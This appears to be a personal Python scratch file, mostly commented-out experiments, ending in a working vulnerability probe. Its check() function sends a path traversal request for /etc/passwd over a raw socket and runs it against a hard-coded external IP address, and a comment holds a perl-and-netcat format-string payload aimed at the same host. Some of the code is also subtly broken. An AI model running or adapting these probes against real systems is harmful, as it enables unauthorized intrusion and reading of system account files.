

import argparse
import imp
import os.path
import re
import shlex
import sys
import collections
from collections.abc import Mapping
import m1

import json
import socket

# print(collections.__file__)
# print(os.path.abspath('./'))


# print([1] + [1, 2, 3])


# class MYApp:
#     def __init__(self) -> None:
#         pass

#     def go(self):
#         return 'YES'


# app = MYApp()
# print(hasattr(app, 'go'))
# print(hasattr(app, 'gos'))

# print('DQ - VERSION : {}'.format(sys.version))
# print(' DQ - CALLER : {}', callable(app))

# # def as_json(kv):
# #     print('DQ - %s' % kv)
# #     assert '=' in kv
# #     k, v = kv.split('=', 1)
# #     v2 = 'GEN_DQ'
# #     try:
# #         return k, json.loads(v2)
# #     except ValueError as e:
# #         print((k, v, v2))
# #         raise e


# # print(dict(map(as_json, "current_cpu=x64")))

# # with open('./test.json', 'w') as f:
# #     json.dump()


# print(' ====> <=== ')


def check(ip, port, timeout):
    try:
        socket.setdefaulttimeout(timeout)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, int(port)))
        flag = "GET /../../../../../../../../../etc/passwd HTTP/1.1\r\n\r\n"
        s.send(flag)
        data = s.recv(1024)
        s.close()
        if 'root:' in data and 'nobody:' in data:
            return u"漏洞"
    except:
        pass
# perl -e 'print"GET /";print"%x"x20;print" HTTP/1.0\r\n\r\n\r\n"' | nc 39.103.217.161 8888 
if __name__ == "__main__":
    print(" >>> m1 running ... ")
    # m1.script_main()
    
    check('39.103.217.161', 8888, 100)
    
    sys.exit(0)
